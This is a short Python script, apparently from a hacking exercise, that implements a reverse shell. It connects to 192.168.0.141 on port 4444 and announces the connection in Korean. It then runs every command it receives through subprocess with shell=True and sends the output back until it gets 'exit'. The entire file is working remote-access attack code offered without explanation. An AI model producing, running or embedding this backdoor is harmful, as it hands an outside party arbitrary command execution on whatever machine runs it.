#!/usr/bin/env python
import socket
import subprocess

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con.connect(("192.168.0.141",4444))

con.send("\n[+] 연결됐음!\n".encode())

while True:
    try:
        command = con.recv(1024).decode().strip()
        if command.lower() == "exit":
            break
        command_result = execute_system_command(command)
        con.send(command_result)
    except Exception as e:
        con.send(f"[-] Error: {str(e)}".encode())

con.close()